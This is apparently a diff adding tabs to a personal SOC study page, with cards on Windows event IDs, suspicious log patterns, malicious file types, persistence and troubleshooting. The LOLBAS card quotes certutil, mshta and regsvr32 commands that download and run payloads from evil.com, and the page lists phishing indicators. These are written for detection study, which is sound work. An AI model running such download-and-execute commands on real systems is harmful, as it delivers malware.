+          <div class="study-item"><span class="port-num">Hash</span><span class="port-desc">MD5/SHA256 file hashes. Submit to: VirusTotal, MalwareBazaar. Uniquely identifies a file regardless of filename. Malware changes filenames but hash stays the same.</span></div>
+          <div class="study-item"><span class="port-num">Email</span><span class="port-desc">Malicious sender addresses. Submit to: VirusTotal. You submitted dipesh34979rana@gmail.com from your Geek Squad phishing investigation.</span></div>
+          <div class="study-item"><span class="port-num">Phone</span><span class="port-desc">Callback scam numbers. Submit to: ScamNumbers.info. You were first reporter for +1 803 843 9754 from your TOAD phishing investigation.</span></div>
+          <div class="study-item"><span class="port-num">URL</span><span class="port-desc">Malicious URLs. Submit to: URLScan.io, VirusTotal, PhishTank. Always analyze in a sandbox — never click directly.</span></div>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="study-eventids" class="study-panel" style="display:none;">
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">🔐 Logon Events</div>
+          <div class="study-item"><span class="port-num">4624</span><span class="port-desc">Successful logon — account successfully authenticated. Check Logon_Type field for how they logged in.</span></div>
+          <div class="study-item"><span class="port-num">4625</span><span class="port-desc">Failed logon — authentication failed. High volume = brute force attack. Check account name and source IP.</span></div>
+          <div class="study-item"><span class="port-num">4634</span><span class="port-desc">Account logged off — session ended. Pair with 4624 to track session duration.</span></div>
+          <div class="study-item"><span class="port-num">4647</span><span class="port-desc">User initiated logoff — user manually logged out. Different from session timeout.</span></div>
+          <div class="study-item"><span class="port-num">4648</span><span class="port-desc">Logon with explicit credentials — someone used RunAs or alternate credentials. Lateral movement indicator.</span></div>
+          <div class="study-item"><span class="port-num">4740</span><span class="port-desc">Account locked out — too many failed attempts triggered lockout policy. Often follows brute force.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔢 Logon Types</div>
+          <div class="study-item"><span class="port-num">Type 2</span><span class="port-desc">Interactive — physical console login. Someone sat at the keyboard.</span></div>
+          <div class="study-item"><span class="port-num">Type 3</span><span class="port-desc">Network — accessed via network share or mapped drive. SMB authentication.</span></div>
+          <div class="study-item"><span class="port-num">Type 4</span><span class="port-desc">Batch — scheduled task or batch job ran under this account.</span></div>
+          <div class="study-item"><span class="port-num">Type 5</span><span class="port-desc">Service — a Windows service logged on using this account.</span></div>
+          <div class="study-item"><span class="port-num">Type 7</span><span class="port-desc">Unlock — workstation was unlocked after being locked.</span></div>
+          <div class="study-item"><span class="port-num">Type 10</span><span class="port-desc">RemoteInteractive — RDP session. Flag unexpected RDP logons immediately.</span></div>
+          <div class="study-item"><span class="port-num">Type 11</span><span class="port-desc">CachedInteractive — logged in using cached domain credentials. No DC contact made.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">👤 Account Management</div>
+          <div class="study-item"><span class="port-num">4720</span><span class="port-desc">User account created — new account added to system. Investigate unexpected account creation immediately.</span></div>
+          <div class="study-item"><span class="port-num">4722</span><span class="port-desc">User account enabled — disabled account was re-enabled. Could indicate backdoor account activation.</span></div>
+          <div class="study-item"><span class="port-num">4723</span><span class="port-desc">Password change attempted — user tried to change their own password.</span></div>
+          <div class="study-item"><span class="port-num">4724</span><span class="port-desc">Password reset attempted — admin reset another user's password. Watch for unauthorized resets.</span></div>
+          <div class="study-item"><span class="port-num">4725</span><span class="port-desc">User account disabled — account was disabled. Could be legitimate or attacker covering tracks.</span></div>
+          <div class="study-item"><span class="port-num">4726</span><span class="port-desc">User account deleted — account was permanently removed. Investigate if unexpected.</span></div>
+          <div class="study-item"><span class="port-num">4732</span><span class="port-desc">User added to security group — privilege change. Adding to Administrators group is critical alert.</span></div>
+          <div class="study-item"><span class="port-num">4733</span><span class="port-desc">User removed from security group — privilege revoked. Could indicate cleanup after attack.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">⚙️ Process & Service</div>
+          <div class="study-item"><span class="port-num">4688</span><span class="port-desc">New process created — a new process started. Check parent process name for suspicious chains like Word spawning PowerShell.</span></div>
+          <div class="study-item"><span class="port-num">4689</span><span class="port-desc">Process terminated — a process ended. Pair with 4688 to track process lifetime.</span></div>
+          <div class="study-item"><span class="port-num">7034</span><span class="port-desc">Service crashed — service terminated unexpectedly. Could indicate exploitation attempt or instability.</span></div>
+          <div class="study-item"><span class="port-num">7035</span><span class="port-desc">Service control sent — start or stop command sent to service.</span></div>
+          <div class="study-item"><span class="port-num">7036</span><span class="port-desc">Service state changed — service entered running or stopped state. Track critical service changes.</span></div>
+          <div class="study-item"><span class="port-num">7045</span><span class="port-desc">New service installed — a new service was created. Malware frequently installs as a service for persistence. High priority alert.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🛡️ Policy & Security</div>
+          <div class="study-item"><span class="port-num">4672</span><span class="port-desc">Special privileges assigned — admin level privileges given to new logon. Monitor all occurrences.</span></div>
+          <div class="study-item"><span class="port-num">4719</span><span class="port-desc">Audit policy changed — logging settings modified. Attackers disable logging to hide activity. Critical alert.</span></div>
+          <div class="study-item"><span class="port-num">4739</span><span class="port-desc">Domain policy changed — domain-wide policy was modified. Should only occur during planned changes.</span></div>
+          <div class="study-item"><span class="port-num">4946</span><span class="port-desc">Firewall rule added — new allow rule created. Could open unwanted access if unauthorized.</span></div>
+          <div class="study-item"><span class="port-num">4947</span><span class="port-desc">Firewall rule modified — existing firewall rule was changed.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🦠 Defender & Malware</div>
+          <div class="study-item"><span class="port-num">1116</span><span class="port-desc">Malware detected — Windows Defender found a threat. Note threat name, path, and whether action was taken.</span></div>
+          <div class="study-item"><span class="port-num">1117</span><span class="port-desc">Action taken on malware — Defender attempted remediation. Check if successful.</span></div>
+          <div class="study-item"><span class="port-num">1118</span><span class="port-desc">Remediation started — Defender began cleaning process.</span></div>
+          <div class="study-item"><span class="port-num">1119</span><span class="port-desc">Remediation succeeded — threat was successfully removed.</span></div>
+          <div class="study-item"><span class="port-num">1120</span><span class="port-desc">Remediation failed — Defender could not remove the threat. Immediate escalation required.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Lab-Specific Event ID Notes</div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">7036</span><span class="port-desc">Windows 11 (CLIENT01) does NOT reliably generate 7036. Use Application log instead. Windows Search stop = Event ID 1013, start = Event ID 1003. Windows Server 2019 (FETT) generates 7036 correctly.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">4728</span><span class="port-desc">YOUR LAB uses 4728 not 4732 for group membership additions. SOC_Analysts is a Global Security Group — Global groups generate 4728. Always check group scope: Global=4728, Domain Local=4732, Universal=4756.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">4624</span><span class="port-desc">On FETT DC the Account_Name field shows TWO values per row (Subject + Target account) — this is normal DC behavior. Use raw text search: index=main "username" instead of Account_Name="username" filter for reliable results.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">4625</span><span class="port-desc">Loopback 127.0.0.1 source = local failed login (user at keyboard). Internal 192.168.15.x source = lateral movement or Kali attack. External IP = remote brute force. Always check Source_Network_Address field.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">Host</span><span class="port-desc">Always specify host= in queries when you know the source machine. CLIENT01 = Windows 11 workstation events. FETT = Domain Controller and AD events. Omitting host= searches all machines and can miss or mix results.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">Fields</span><span class="port-desc">When table query returns 0 results — run without table command first, click raw event, check actual field names on left panel. Field names vary between Windows versions and log types. Never assume field names — always verify.</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- LOG AWARENESS TAB -->
+    <div id="study-logaware" class="study-panel" style="display:none;">
+      <div style="background:rgba(0,212,255,0.05);border:1px solid rgba(0,212,255,0.2);border-radius:8px;padding:16px;margin-bottom:20px;">
+        <div style="color:#00d4ff;font-family:'Share Tech Mono',monospace;font-size:12px;font-weight:700;margin-bottom:8px;">📌 HOW TO READ THIS TAB</div>
+        <div style="color:#8899aa;font-size:12px;line-height:1.7;">
+          Understanding which logs are <strong style="color:#00ff9d;">normal</strong> vs <strong style="color:#ff4444;">suspicious</strong> is the core skill of SOC analysis. The same event can be benign or malicious depending on context — source IP, time of day, user account, and frequency all matter.
+        </div>
+      </div>
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">✅ Normal / Expected Log Activity</div>
+          <div class="study-item"><span class="port-num" style="background:rgba(0,255,100,0.1);color:#00ff9d;">4624</span><span class="port-desc">Successful logon during business hours from known IP. Example: Administrator logs into CLIENT01 at 9am from 192.168.15.1 — completely normal.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(0,255,100,0.1);color:#00ff9d;">4625</span><span class="port-desc">1-3 failed logins then success. Example: User mistyped password twice then logged in successfully — forgot password, not an attack.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(0,255,100,0.1);color:#00ff9d;">7036</span><span class="port-desc">Windows Update service starting/stopping. Example: wuauserv starting at 3am — scheduled Windows Update running, completely expected.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(0,255,100,0.1);color:#00ff9d;">4688</span><span class="port-desc">explorer.exe spawning chrome.exe or notepad.exe. Example: User opened browser from desktop — normal parent/child process relationship.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(0,255,100,0.1);color:#00ff9d;">4672</span><span class="port-desc">Administrator account assigned special privileges at logon. Expected every time a domain admin logs in — this is normal admin behavior.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(0,255,100,0.1);color:#00ff9d;">4634</span><span class="port-desc">Account logoff at end of business day. Example: User logs off CLIENT01 at 5pm — completely normal end of day activity.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(0,255,100,0.1);color:#00ff9d;">1102</span><span class="port-desc">Audit log cleared by IT admin during maintenance. Normal IF scheduled and authorized — always verify with change management records.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔴 Suspicious / Malicious Log Activity</div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">4625</span><span class="port-desc">50+ failed logins per minute from same IP. Example: 262 failed logins in 60 seconds from 192.168.15.200 (Kali) — active brute force. This is exactly what your homelab investigation detected.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">4688</span><span class="port-desc">Word.exe or Excel.exe spawning powershell.exe or cmd.exe. Example: WINWORD.EXE → powershell.exe — malicious macro executing code. Massive red flag.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">4720</span><span class="port-desc">New user account created at 3am by non-admin account. Example: backdoor_user created at 2:47am by SYSTEM — attacker creating persistence account.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">7045</span><span class="port-desc">New service with random name installed. Example: service named "svc_xk9m2" installed pointing to C:\Temp\payload.exe — malware installing persistence.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">4719</span><span class="port-desc">Audit policy disabled outside maintenance window. Example: Security auditing disabled at 11pm — attacker disabling logging to hide activity.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">4732</span><span class="port-desc">Unknown account added to Administrators group. Example: guest account added to Domain Admins — privilege escalation attack.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">4624</span><span class="port-desc">Successful logon at 3am Type 10 (RDP) from foreign IP. Example: Administrator logs in via RDP from 185.220.x.x at 3am — unauthorized remote access.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">⚠️ Context Makes The Difference</div>
+          <div class="study-item"><span class="port-num">Same Event</span><span class="port-desc">4625 x3 from loopback = user forgot password. 4625 x300 from external IP = brute force attack. Same event ID — completely different meaning.</span></div>
+          <div class="study-item"><span class="port-num">Time Context</span><span class="port-desc">Admin login at 9am = normal. Same admin login at 3am on a Sunday = investigate immediately. Always check if activity matches normal patterns.</span></div>
+          <div class="study-item"><span class="port-num">Source IP</span><span class="port-desc">127.0.0.1 loopback = local activity. 192.168.15.x internal = lateral movement possible. Foreign country IP = external threat actor.</span></div>
+          <div class="study-item"><span class="port-num">Frequency</span><span class="port-desc">One failed login = typo. One thousand failed logins in one minute = automated attack tool running. Always look at rate not just count.</span></div>
+          <div class="study-item"><span class="port-num">Parent Process</span><span class="port-desc">svchost.exe spawning from services.exe = normal. svchost.exe spawning from word.exe = malware. Parent process relationship reveals intent.</span></div>
+          <div class="study-item"><span class="port-num">Account Type</span><span class="port-desc">SYSTEM running a service = normal. SYSTEM creating new user accounts = suspicious. Service accounts should not be doing administrative actions.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📊 False Positives — Know These</div>
+          <div class="study-item"><span class="port-num">APIPA</span><span class="port-desc">169.254.x.x blocked by ESET. Your investigation found 72 blocks to 169.254.69.62 — confirmed false positive caused by DHCP failure during Eero outage. Not malicious.</span></div>
+          <div class="study-item"><span class="port-num">AV Conflict</span><span class="port-desc">Security software flagging other security software. ESET or Defender flagging Huntress agent files. Fix with exclusions — not a real threat.</span></div>
+          <div class="study-item"><span class="port-num">Windows Update</span><span class="port-desc">Multiple services starting/stopping during update cycle. Temporary spikes in Event ID 7036 during patch Tuesday — expected behavior.</span></div>
+          <div class="study-item"><span class="port-num">Backup Software</span><span class="port-desc">Backup agents accessing many files rapidly can look like ransomware to SIEM rules. Verify schedule against backup software logs.</span></div>
+          <div class="study-item"><span class="port-num">Password Sync</span><span class="port-desc">Password manager or SSO systems generate multiple authentication events during sync. Can appear as brute force if not tuned properly.</span></div>
+          <div class="study-item"><span class="port-num">Scanner</span><span class="port-desc">Vulnerability scanners like Nessus generate massive amounts of connection attempts — looks exactly like an attack. Always whitelist scanner IPs.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔵 Normal Windows Processes</div>
+          <div class="study-item"><span class="port-num">svchost.exe</span><span class="port-desc">Service Host — runs Windows services. Multiple instances are NORMAL. Suspicious if: running from wrong path (should be C:\Windows\System32), or has unusual parent process.</span></div>
+          <div class="study-item"><span class="port-num">lsass.exe</span><span class="port-desc">Local Security Authority — handles authentication. Should only run once from System32. If a tool tries to access lsass memory — Mimikatz credential dump attempt.</span></div>
+          <div class="study-item"><span class="port-num">explorer.exe</span><span class="port-desc">Windows shell — file manager and desktop. Should run from C:\Windows. Suspicious if running from Temp or AppData folders.</span></div>
+          <div class="study-item"><span class="port-num">winlogon.exe</span><span class="port-desc">Handles login/logout. Should only have one instance. Running from anywhere other than System32 is malware.</span></div>
+          <div class="study-item"><span class="port-num">services.exe</span><span class="port-desc">Service Control Manager — starts and stops services. Should be parent of svchost.exe. If svchost has different parent — red flag.</span></div>
+          <div class="study-item"><span class="port-num">csrss.exe</span><span class="port-desc">Client Server Runtime — core Windows process. Should run from System32. Malware commonly masquerades as csrss.exe with typos like cssrs.exe.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔴 Suspicious Process Behaviors</div>
+          <div class="study-item"><span class="port-num">Wrong Path</span><span class="port-desc">svchost.exe running from C:\Temp instead of C:\Windows\System32. Legitimate Windows processes always run from System32 or SysWOW64. Wrong path = malware masquerading.</span></div>
+          <div class="study-item"><span class="port-num">Typosquatting</span><span class="port-desc">svch0st.exe (zero instead of O), cssrs.exe, lssas.exe. Malware uses names nearly identical to legitimate processes. Always check exact spelling in Process Explorer.</span></div>
+          <div class="study-item"><span class="port-num">Unusual Parent</span><span class="port-desc">powershell.exe spawned by winword.exe. cmd.exe spawned by excel.exe. These Office apps should never spawn command line tools — malicious macro indicator.</span></div>
+          <div class="study-item"><span class="port-num">No Signature</span><span class="port-desc">Legitimate Windows processes are always digitally signed by Microsoft. Unsigned process in System32 is a major red flag. Check with Process Explorer VirusTotal integration.</span></div>
+          <div class="study-item"><span class="port-num">Temp Execution</span><span class="port-desc">Any executable running from C:\Temp, C:\Users\[user]\AppData\Local\Temp, or Downloads folder. Malware frequently drops payloads in temp directories.</span></div>
+          <div class="study-item"><span class="port-num">Network + Code</span><span class="port-desc">Process making outbound connections that should not need internet. Example: notepad.exe connecting to 185.220.x.x — notepad never needs network access.</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- MALICIOUS FILES TAB -->
+    <div id="study-malicious" class="study-panel" style="display:none;">
+      <div style="background:rgba(255,50,50,0.05);border:1px solid rgba(255,50,50,0.2);border-radius:8px;padding:16px;margin-bottom:20px;">
+        <div style="color:#ff4444;font-family:'Share Tech Mono',monospace;font-size:12px;font-weight:700;margin-bottom:8px;">⚠️ THREAT AWARENESS REFERENCE</div>
+        <div style="color:#8899aa;font-size:12px;line-height:1.7;">
+          This tab covers malicious file types, extensions, and attack techniques. Understanding what attackers use helps you recognize threats faster. Always submit suspicious files to <span style="color:#00ff9d;">VirusTotal</span> or <span style="color:#00ff9d;">ANY.RUN</span> for analysis.
+        </div>
+      </div>
+      <div class="study-grid">
+        <div class="study-card">
+          <div class="study-card-title">☣️ High Risk File Extensions</div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">.exe</span><span class="port-desc">Executable — most common malware delivery. Example: invoice_2026.exe — always suspicious when received via email. Should never be in email attachments.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">.ps1</span><span class="port-desc">PowerShell script. Example: update.ps1 — attackers use PowerShell for fileless malware. Execution generates Event ID 4688 with powershell.exe in New_Process_Name.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">.vbs</span><span class="port-desc">Visual Basic Script. Example: invoice.vbs — runs in Windows Script Host. Often used to download and execute malware. Generates wscript.exe process.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">.bat</span><span class="port-desc">Batch file — Windows command script. Example: cleanup.bat — can delete logs, add users, disable services. Runs as cmd.exe child process.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">.hta</span><span class="port-desc">HTML Application — runs with elevated privileges via mshta.exe. Example: update.hta — bypasses some security controls because it uses trusted Windows component.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">.dll</span><span class="port-desc">Dynamic Link Library — can be loaded by other processes. Example: malicious.dll injected into svchost.exe — DLL injection is common persistence and evasion technique.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">.lnk</span><span class="port-desc">Windows shortcut file. Example: Resume.pdf.lnk — looks like a PDF but actually a shortcut that executes malicious command when double clicked.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,50,50,0.1);color:#ff4444;">.iso</span><span class="port-desc">Disk image file. Example: software.iso — increasingly used by attackers because Windows mounts ISO files directly and contents bypass Mark of the Web security warnings.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📄 Document Based Threats</div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.docm</span><span class="port-desc">Word document with macros enabled. Example: invoice_march.docm — the m means macros. Malicious macros run VBA code that downloads malware. Generates WINWORD.EXE → powershell.exe chain.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.xlsm</span><span class="port-desc">Excel with macros. Example: payroll_2026.xlsm — same risk as docm but in spreadsheet form. Finance departments targeted frequently with fake payroll or invoice files.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.pdf</span><span class="port-desc">PDFs can contain embedded JavaScript or malicious links. Example: contract_signed.pdf — PDF with embedded script that exploits Adobe Reader. Always open in browser not desktop app.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.docx</span><span class="port-desc">Standard Word document — lower risk than docm but can contain external OLE objects or template injection. Example: job_application.docx loading remote template with malicious macro.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.one</span><span class="port-desc">Microsoft OneNote file. Recently abused heavily. Example: instructions.one — OneNote files can embed and execute scripts. Became popular after Office disabled macros by default.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.rtf</span><span class="port-desc">Rich Text Format — can contain embedded objects. Example: meeting_notes.rtf — RTF files have been used to exploit Word via embedded OLE objects without needing macros.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">📦 Archive & Container Threats</div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.zip</span><span class="port-desc">Archives bypass email attachment filters. Example: invoice.zip containing invoice.exe — security tools scan the zip but may miss the executable inside. Always extract and scan contents.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.rar</span><span class="port-desc">Compressed archive — same risk as zip. Password protected RARs are used to bypass email scanning since scanner cannot open encrypted archive to check contents.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.7z</span><span class="port-desc">7-Zip archive — commonly password protected in attacks. Example: documents_confidential.7z with password in email body — password prevents AV scanning of contents.</span></div>
+          <div class="study-item"><span class="port-num" style="background:rgba(255,165,0,0.1);color:#ffaa00;">.img</span><span class="port-desc">Disk image similar to ISO. Example: software_crack.img — mounts as virtual drive in Windows. Contents bypass Mark of the Web protection same as ISO files.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🔧 Living Off The Land (LOLBAS)</div>
+          <div class="study-item"><span class="port-num">certutil</span><span class="port-desc">Legitimate Windows tool abused to download files. Example: certutil -urlcache -f http://evil.com/payload.exe C:\Temp\payload.exe — downloads malware using trusted Windows binary. Generates suspicious 4688 event.</span></div>
+          <div class="study-item"><span class="port-num">mshta</span><span class="port-desc">Runs HTML Applications. Abused to execute remote scripts. Example: mshta http://evil.com/payload.hta — downloads and runs malicious HTA without saving to disk first.</span></div>
+          <div class="study-item"><span class="port-num">regsvr32</span><span class="port-desc">Registers COM objects — abused to run malicious DLLs. Example: regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll — Squiblydoo attack bypasses AppLocker.</span></div>
+          <div class="study-item"><span class="port-num">wscript</span><span class="port-desc">Windows Script Host runs VBS and JS files. Example: wscript.exe malware.vbs — often spawned by email attachments or malicious downloads.</span></div>
+          <div class="study-item"><span class="port-num">powershell</span><span class="port-desc">Most abused LOLBAS tool. Example: powershell -enc [base64] — encoded commands hide malicious content from basic inspection. Always decode Base64 in CyberChef to see real command.</span></div>
+          <div class="study-item"><span class="port-num">rundll32</span><span class="port-desc">Runs DLL files — abused to execute malicious DLLs. Example: rundll32.exe evil.dll,EntryPoint — loads and executes attacker controlled DLL using trusted Windows process.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🦠 Malware Categories</div>
+          <div class="study-item"><span class="port-num">Ransomware</span><span class="port-desc">Encrypts files and demands payment. Example: WannaCry encrypted files renaming them .WNCRY. Indicators: mass file modifications, new file extensions, ransom note text files, VSS deletion commands.</span></div>
+          <div class="study-item"><span class="port-num">RAT</span><span class="port-desc">Remote Access Trojan — gives attacker full control. Example: njRAT, AsyncRAT. Establishes persistent outbound connection to C2 server. Generates unusual outbound connections on non-standard ports.</span></div>
+          <div class="study-item"><span class="port-num">Infostealer</span><span class="port-desc">Steals credentials, cookies, crypto wallets. Example: Redline Stealer, Raccoon. Targets browser saved passwords, session cookies. Huntress ITDR detects stolen session cookie reuse.</span></div>
+          <div class="study-item"><span class="port-num">Keylogger</span><span class="port-desc">Records keystrokes to capture passwords. Example: every key you type sent to attacker. Often bundled with other malware. Detected by monitoring suspicious process hooks on lsass.exe.</span></div>
+          <div class="study-item"><span class="port-num">Rootkit</span><span class="port-desc">Hides malware from OS and security tools. Operates at kernel level. Very difficult to detect — requires specialized tools. Huntress EDR monitors at driver level to catch rootkit behavior.</span></div>
+          <div class="study-item"><span class="port-num">Wiper</span><span class="port-desc">Destroys data — no ransom, just destruction. Example: NotPetya. Nation-state weapon. Overwrites MBR and files making system unbootable. No recovery without clean backups.</span></div>
+        </div>
+        <div class="study-card">
+          <div class="study-card-title">🛡️ Common Persistence Locations</div>
+          <div class="study-item"><span class="port-num">Run Keys</span><span class="port-desc">Registry: HKLM\Software\Microsoft\Windows\CurrentVersion\Run — programs here run at every startup. Check with Autoruns. Example: malware adds itself here to survive reboots. Generates no event ID — only visible in registry.</span></div>
+          <div class="study-item"><span class="port-num">Startup Folder</span><span class="port-desc">C:\Users\[user]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup — anything here runs when user logs in. Easy persistence location — no admin needed.</span></div>
+          <div class="study-item"><span class="port-num">Scheduled Tasks</span><span class="port-desc">Task Scheduler used to run malware on schedule. Example: task named "WindowsUpdate" running payload.exe every hour. Check with: schtasks /query /fo LIST /v in PowerShell.</span></div>
+          <div class="study-item"><span class="port-num">Services</span><span class="port-desc">Event ID 7045 — new service installed. Malware installs as service for automatic startup. Example: service named "svc_update" pointing to C:\Temp\malware.exe.</span></div>
+          <div class="study-item"><span class="port-num">DLL Hijacking</span><span class="port-desc">Placing malicious DLL where legitimate application loads it first. Application runs, loads malicious DLL instead of real one. Attacker gets code execution every time app runs.</span></div>
+          <div class="study-item"><span class="port-num">WMI Subscriptions</span><span class="port-desc">Windows Management Instrumentation event subscriptions — fileless persistence that survives reboots with no files on disk. Very stealthy. Detected by monitoring WMI activity in Sysmon logs.</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- TROUBLESHOOTING TAB -->
+    <div id="study-troubleshoot" class="study-panel" style="display:none;">
+      <div style="background:rgba(0,212,255,0.05);border:1px solid rgba(0,212,255,0.2);border-radius:8px;padding:16px;margin-bottom:20px;">
+        <div style="color:#00d4ff;font-family:'Share Tech Mono',monospace;font-size:12px;font-weight:700;margin-bottom:8px;">📌 PRODUCT SUPPORT TROUBLESHOOTING REFERENCE</div>
+        <div style="color:#8899aa;font-size:12px;line-height:1.7;">
+          Structured troubleshooting for entry level Product Support and TSE roles. Always follow the same methodology: <strong style="color:#e2e8f0;">1) Identify the problem → 2) Gather info → 3) Isolate cause → 4) Apply fix → 5) Verify → 6) Document.</strong> Start with the simplest explanation before assuming complex causes.
+        </div>
+      </div>
+      <div class="study-grid">
+
+        <div class="study-card">
+          <div class="study-card-title">🌐 Network Connectivity — Universal Steps</div>
+          <div class="study-item"><span class="port-num">Step 1</span><span class="port-desc">Ask the customer: Is it one device or all devices affected? One device = local issue. All devices = router/ISP/network issue. This single question determines your entire troubleshooting path.</span></div>
+          <div class="study-item"><span class="port-num">Step 2</span><span class="port-desc">Check physical connection first. Is ethernet cable plugged in? Is WiFi enabled? Are any lights off on the router or switch? Physical layer issues are the most common and fastest to fix.</span></div>
+          <div class="study-item"><span class="port-num">Step 3</span><span class="port-desc">Verify IP address is assigned. Windows: ipconfig. Linux/Mac: ifconfig or ip addr. If showing 169.254.x.x (APIPA) — DHCP failed. If showing 0.0.0.0 — no connection at all.</span></div>
+          <div class="study-item"><span class="port-num">Step 4</span><span class="port-desc">Ping the gateway (router). Windows: ping 192.168.1.1. If ping fails = cannot reach router. If ping succeeds = local network works, problem is internet side.</span></div>
+          <div class="study-item"><span class="port-num">Step 5</span><span class="port-desc">Ping external IP: ping 8.8.8.8. If this works but websites don't load = DNS problem not connectivity. If this fails = internet connection down.</span></div>
+          <div class="study-item"><span class="port-num">Step 6</span><span class="port-desc">Test DNS: ping google.com. If 8.8.8.8 works but google.com fails = DNS resolution broken. Fix: change DNS to 8.8.8.8 manually or flush DNS cache.</span></div>
+          <div class="study-item"><span class="port-num">Step 7</span><span class="port-desc">If all above fails — restart in order: modem first, wait 60 seconds, then router, wait 30 seconds, then device. This resolves majority of connectivity issues.</span></div>
+        </div>
+
+        <div class="study-card">
+          <div class="study-card-title">🪟 Windows Troubleshooting</div>
+          <div class="study-item"><span class="port-num">No Internet</span><span class="port-desc">CMD as Admin: netsh winsock reset → netsh int ip reset → ipconfig /release → ipconfig /flushdns → ipconfig /renew → restart. This resets entire network stack. Fixes most Windows connectivity issues.</span></div>
+          <div class="study-item"><span class="port-num">Slow PC</span><span class="port-desc">Check Task Manager (Ctrl+Shift+Esc): CPU, Memory, Disk columns. Identify top consumer. High disk usage = check for Windows Update running or malware scan. High CPU = identify process and check legitimacy in Process Explorer.</span></div>
+          <div class="study-item"><span class="port-num">App Won't Start</span><span class="port-desc">Right click → Run as Administrator first. If still fails: Check Event Viewer → Windows Logs → Application for errors at time of crash. Note Event ID and error message for troubleshooting.</span></div>
+          <div class="study-item"><span class="port-num">Windows Update Stuck</span><span class="port-desc">Services.msc → Stop Windows Update service → Delete contents of C:\Windows\SoftwareDistribution\Download → Start Windows Update service → Try update again.</span></div>
+          <div class="study-item"><span class="port-num">Can't Login</span><span class="port-desc">Check Caps Lock. Try PIN instead of password. If domain account — check if account is locked in AD (Event ID 4740). Reset password from DC if needed. Check if DC is reachable: ping 192.168.15.44.</span></div>
+          <div class="study-item"><span class="port-num">Blue Screen</span><span class="port-desc">Note the stop code shown. Check Event Viewer → Windows Logs → System for Critical errors at crash time. Common causes: bad driver update, RAM failure, storage issues. Run: sfc /scannow in CMD as Admin.</span></div>
